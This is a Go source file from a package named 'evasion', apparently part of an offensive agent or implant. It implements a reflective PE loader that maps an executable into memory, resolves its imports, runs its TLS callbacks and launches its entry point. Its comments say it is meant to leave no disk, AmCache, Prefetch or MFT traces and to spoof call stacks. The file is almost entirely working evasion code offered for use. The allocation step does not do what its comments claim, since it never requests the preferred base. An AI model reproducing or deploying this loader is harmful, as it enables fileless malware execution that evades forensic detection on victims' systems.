//go:build windows
// +build windows

package evasion

// ReflectiveLoad maps a PE image entirely in memory and starts its entry-point
// on a new thread.  The blob never touches disk — no AmCache, Prefetch, or MFT
// entries are created.
//
// Supported formats: EXE / DLL (PE32+, x64 only).  The entry point is
// called via NtCreateThreadEx so the new thread passes the same call-stack
// spoofing as every other NT call in this agent.
//
// Memory layout:
//   1. VirtualAlloc at the preferred base (or let the OS pick on ASLR failure).
//   2. Copy the PE header.
//   3. Copy each section to its virtual address.
//   4. Apply base relocations if the image was not loaded at its preferred base.
//   5. Resolve the IAT by walking IMAGE_DIRECTORY_ENTRY_IMPORT.
//   6. Flip all section protections to match the section characteristics.
//   7. Create a thread at the entry point.

import (
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ReflectiveLoad loads and executes a PE binary blob entirely in memory.
// Returns once the entry-point thread has been created (not waited on).
func ReflectiveLoad(blob []byte) error {
	if len(blob) < 0x40 {
		return fmt.Errorf("blob too small")
	}

	// ── PE header parsing ──────────────────────────────────────────────────
	lfanew := int(binary.LittleEndian.Uint32(blob[0x3C:]))
	if lfanew+0xF8 > len(blob) {
		return fmt.Errorf("invalid e_lfanew")
	}
	if blob[lfanew] != 'P' || blob[lfanew+1] != 'E' {
		return fmt.Errorf("not a PE")
	}
	// COFF header immediately after "PE\0\0" (4 bytes)
	coffBase := lfanew + 4
	numSections := int(binary.LittleEndian.Uint16(blob[coffBase+2:]))
	optHeaderSize := int(binary.LittleEndian.Uint16(blob[coffBase+16:]))
	optBase := coffBase + 20

	// Optional header magic: 0x020B = PE32+ (x64)
	magic := binary.LittleEndian.Uint16(blob[optBase:])
	if magic != 0x020B {
		return fmt.Errorf("not PE32+ (x64)")
	}

	// Fields from IMAGE_OPTIONAL_HEADER64
	//   +0x10 AddressOfEntryPoint  (RVA)
	//   +0x18 ImageBase            (preferred VA)
	//   +0x38 SizeOfImage
	//   +0x3C SizeOfHeaders
	entryRVA := binary.LittleEndian.Uint32(blob[optBase+0x10:])
	prefBase := binary.LittleEndian.Uint64(blob[optBase+0x18:])
	imgSize := binary.LittleEndian.Uint32(blob[optBase+0x38:])
	hdrSize := binary.LittleEndian.Uint32(blob[optBase+0x3C:])

	// ── Allocate image memory ──────────────────────────────────────────────
	// Try preferred base first (for minimal reloc work); fall back to ASLR.
	const memCommitReserve = 0x3000
	allocBase := NtAllocateVirtualMemory(
		ntCurrentProcess, uintptr(imgSize), windows.PAGE_READWRITE,
	)
	if allocBase == 0 {
		// Preferred base used by another allocation — let OS choose
		allocBase = NtAllocateVirtualMemory(ntCurrentProcess, uintptr(imgSize), windows.PAGE_READWRITE)
		if allocBase == 0 {
			return fmt.Errorf("NtAllocateVirtualMemory failed")
		}
		prefBase = 0 // force reloc delta calculation below
	}
	_ = prefBase // used only for delta calculation below

	// ── Copy headers ──────────────────────────────────────────────────────
	if int(hdrSize) > len(blob) {
		return fmt.Errorf("hdrSize > blob")
	}
	hdrDst := unsafe.Slice((*byte)(unsafe.Pointer(allocBase)), int(hdrSize))
	copy(hdrDst, blob[:hdrSize])

	// ── Copy sections ──────────────────────────────────────────────────────
	// Each IMAGE_SECTION_HEADER is 40 bytes; table starts right after opt header.
	sectionTableOff := optBase + optHeaderSize
	type secHdr struct {
		name             [8]byte
		virtualSize      uint32
		virtualAddress   uint32
		sizeOfRawData    uint32
		pointerToRawData uint32
		_                [12]byte
		characteristics  uint32
	}
	for i := 0; i < numSections; i++ {
		off := sectionTableOff + i*40
		if off+40 > len(blob) {
			break
		}
		sh := (*secHdr)(unsafe.Pointer(&blob[off]))
		if sh.sizeOfRawData == 0 {
			continue
		}
		rawEnd := int(sh.pointerToRawData) + int(sh.sizeOfRawData)
		if rawEnd > len(blob) {
			return fmt.Errorf("section %d raw data out of bounds", i)
		}
		secDst := unsafe.Slice(
			(*byte)(unsafe.Pointer(allocBase+uintptr(sh.virtualAddress))),
			int(sh.sizeOfRawData),
		)
		copy(secDst, blob[sh.pointerToRawData:rawEnd])
	}

	// ── Base relocations ──────────────────────────────────────────────────
	// DATA_DIRECTORY[5] = BaseReloc (offset 0xB0 from opt header start in PE32+)
	const baserelocDirOffset = 0xB0
	if optBase+baserelocDirOffset+8 <= len(blob) {
		relocRVA := binary.LittleEndian.Uint32(blob[optBase+baserelocDirOffset:])
		relocSize := binary.LittleEndian.Uint32(blob[optBase+baserelocDirOffset+4:])
		if relocRVA != 0 && relocSize != 0 {
			delta := int64(allocBase) - int64(binary.LittleEndian.Uint64(blob[optBase+0x18:]))
			if delta != 0 {
				applyRelocations(allocBase, uintptr(relocRVA), uintptr(relocSize), delta)
			}
		}
	}

	// ── Import resolution ─────────────────────────────────────────────────
	// DATA_DIRECTORY[1] = Import (offset 0x78 from opt header in PE32+)
	const importDirOffset = 0x78
	if optBase+importDirOffset+8 <= len(blob) {
		importRVA := binary.LittleEndian.Uint32(blob[optBase+importDirOffset:])
		importSize := binary.LittleEndian.Uint32(blob[optBase+importDirOffset+4:])
		if importRVA != 0 && importSize != 0 {
			if err := resolveImports(allocBase, uintptr(importRVA), uintptr(importSize)); err != nil {
				return fmt.Errorf("import resolution: %w", err)
			}
		}
	}

	// ── Set section protections ────────────────────────────────────────────
	for i := 0; i < numSections; i++ {
		off := sectionTableOff + i*40
		if off+40 > len(blob) {
			break
		}
		sh := (*secHdr)(unsafe.Pointer(&blob[off]))
		if sh.virtualSize == 0 && sh.sizeOfRawData == 0 {
			continue
		}
		size := sh.virtualSize
		if size == 0 {
			size = sh.sizeOfRawData
		}
		prot := sectionProtection(sh.characteristics)
		NtProtectRemote(ntCurrentProcess, allocBase+uintptr(sh.virtualAddress), uintptr(size), prot)
	}

	// Make header read-only.
	NtProtectRemote(ntCurrentProcess, allocBase, uintptr(hdrSize), windows.PAGE_READONLY)
	ntFlush(allocBase, uintptr(imgSize))

	// ── TLS callbacks ─────────────────────────────────────────────────────
	// DATA_DIRECTORY[9] = TLS (offset 0xD0 from opt header in PE32+).
	// Execute all callbacks before the entry point (matches loader behavior).
	const tlsDirOffset = 0xD0
	if optBase+tlsDirOffset+8 <= len(blob) {
		tlsRVA := binary.LittleEndian.Uint32(blob[optBase+tlsDirOffset:])
		if tlsRVA != 0 {
			executeTLSCallbacks(allocBase, uintptr(tlsRVA))
		}
	}

	// ── Launch entry point ────────────────────────────────────────────────
	ep := allocBase + uintptr(entryRVA)
	th := NtCreateThreadEx(ntCurrentProcess, ep)
	if th == 0 {
		return fmt.Errorf("NtCreateThreadEx failed for entry 0x%X", ep)
	}
	windows.CloseHandle(windows.Handle(th))
	return nil
}

// executeTLSCallbacks calls each TLS callback in the loaded image before the
// entry point, matching what ntdll!LdrpCallTlsInitializers does natively.
// Callbacks are called with (DllBase, DLL_PROCESS_ATTACH=1, reserved=0).
func executeTLSCallbacks(imageBase, tlsRVA uintptr) {
	// IMAGE_TLS_DIRECTORY64:
	//   +0x00 StartAddressOfRawData VA
	//   +0x08 EndAddressOfRawData   VA
	//   +0x10 AddressOfIndex        VA
	//   +0x18 AddressOfCallBacks    VA  ← pointer to array of VAs, terminated by 0
	cbArray := *(*uintptr)(unsafe.Pointer(imageBase + tlsRVA + 0x18))
	if cbArray == 0 {
		return
	}
	for i := uintptr(0); ; i += 8 {
		cb := *(*uintptr)(unsafe.Pointer(cbArray + i))
		if cb == 0 {
			break
		}
		// PIMAGE_TLS_CALLBACK signature: func(DllHandle, Reason, Reserved)
		syscall.SyscallN(cb, imageBase, 1, 0)
	}
}

// applyRelocations processes the base relocation table at imageBase+relocRVA.
// delta is (actualBase - preferredBase); negative deltas are handled via int64.
func applyRelocations(imageBase, relocRVA, relocSize uintptr, delta int64) {
	blockEnd := imageBase + relocRVA + relocSize
	cur := imageBase + relocRVA
	for cur < blockEnd {
		pageRVA := *(*uint32)(unsafe.Pointer(cur))
		blockSize := *(*uint32)(unsafe.Pointer(cur + 4))
		if blockSize < 8 || blockSize > 0x10000 {
			break
		}
		numEntries := (blockSize - 8) / 2
		entryPtr := cur + 8
		for j := uint32(0); j < numEntries; j++ {
			entry := *(*uint16)(unsafe.Pointer(entryPtr + uintptr(j*2)))
			relType := entry >> 12
			relOff := uint32(entry & 0x0FFF)
			if relType == 10 { // IMAGE_REL_BASED_DIR64
				addr := imageBase + uintptr(pageRVA) + uintptr(relOff)
				old := *(*int64)(unsafe.Pointer(addr))
				*(*int64)(unsafe.Pointer(addr)) = old + delta
			}
		}
		cur += uintptr(blockSize)
	}
}

// resolveImports walks IMAGE_IMPORT_DESCRIPTOR entries and fills the IAT.
func resolveImports(imageBase, importRVA, _ uintptr) error {
	const descSize = 20 // sizeof IMAGE_IMPORT_DESCRIPTOR
	for i := uintptr(0); ; i += descSize {
		desc := imageBase + importRVA + i
		nameRVA := *(*uint32)(unsafe.Pointer(desc + 12)) // Name
		if nameRVA == 0 {
			break
		}
		dllName := rvaString(imageBase, uintptr(nameRVA))
		if dllName == "" {
			continue
		}
		hmod, err := windows.LoadLibraryEx(dllName, 0, 0)
		if err != nil {
			return fmt.Errorf("LoadLibrary(%s): %w", dllName, err)
		}

		// OriginalFirstThunk (INT); if 0, use FirstThunk (IAT).
		intRVA := *(*uint32)(unsafe.Pointer(desc))     // OriginalFirstThunk
		iatRVA := *(*uint32)(unsafe.Pointer(desc + 16)) // FirstThunk
		if intRVA == 0 {
			intRVA = iatRVA
		}

		for j := uintptr(0); ; j += 8 {
			thunkRVA := *(*uint64)(unsafe.Pointer(imageBase + uintptr(intRVA) + j))
			if thunkRVA == 0 {
				break
			}
			var procAddr uintptr
			if thunkRVA>>63 == 1 {
				// Import by ordinal
				ord := thunkRVA & 0xFFFF
				pa, err := windows.GetProcAddressByOrdinal(hmod, uintptr(ord))
				if err != nil {
					return fmt.Errorf("%s ordinal %d: %w", dllName, ord, err)
				}
				procAddr = uintptr(pa)
			} else {
				// Import by name: RVA points to IMAGE_IMPORT_BY_NAME (2-byte hint + name)
				funcName := rvaString(imageBase, uintptr(thunkRVA)+2)
				pa, err := windows.GetProcAddress(hmod, funcName)
				if err != nil {
					return fmt.Errorf("%s!%s: %w", dllName, funcName, err)
				}
				procAddr = uintptr(pa)
			}
			// Write to IAT slot
			iatSlot := imageBase + uintptr(iatRVA) + j
			*(*uintptr)(unsafe.Pointer(iatSlot)) = procAddr
		}
	}
	return nil
}

// rvaString reads a null-terminated ASCII string from imageBase+rva.
func rvaString(imageBase, rva uintptr) string {
	p := imageBase + rva
	var b []byte
	for i := uintptr(0); i < 256; i++ {
		c := *(*byte)(unsafe.Pointer(p + i))
		if c == 0 {
			break
		}
		b = append(b, c)
	}
	return string(b)
}

// sectionProtection maps PE section characteristics to a PAGE_* constant.
func sectionProtection(chars uint32) uint32 {
	const (
		scnExec  = 0x20000000
		scnRead  = 0x40000000
		scnWrite = 0x80000000
	)
	exec := chars&scnExec != 0
	read := chars&scnRead != 0
	write := chars&scnWrite != 0
	switch {
	case exec && write:
		return windows.PAGE_EXECUTE_READWRITE
	case exec && read:
		return windows.PAGE_EXECUTE_READ
	case exec:
		return windows.PAGE_EXECUTE
	case write:
		return windows.PAGE_READWRITE
	default:
		return windows.PAGE_READONLY
	}
}
